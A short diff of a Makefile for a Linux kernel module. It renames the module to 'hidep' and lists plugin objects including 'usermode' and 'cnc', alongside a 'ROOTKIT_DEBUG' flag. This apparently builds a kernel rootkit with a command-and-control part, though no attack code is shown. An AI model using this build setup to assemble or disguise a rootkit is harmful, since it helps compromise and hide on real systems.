@@ -1,5 +1,5 @@
 # Module name
-PROGRAM			:= colman
+PROGRAM			:= hidep
 
 # Build
 MODULEDIR 		:= /lib/modules/$(shell uname -r)
@@ -32,7 +32,7 @@ $(PROGRAM)-y	+= src/plugins/usermode.o
 $(PROGRAM)-y	+= src/plugins/cnc.o
 
 
-ccflags-y 		:= -I$(SRCS_H) -I$(LIBS_H) -I$(PLUGINS_H) # -DROOTKIT_DEBUG
+ccflags-y 		:= -I$(SRCS_H) -I$(LIBS_H) -I$(PLUGINS_H) #-DROOTKIT_DEBUG
 
 all:
 	$(MAKE) -C $(BUILDDIR) M=$(PWD) modules
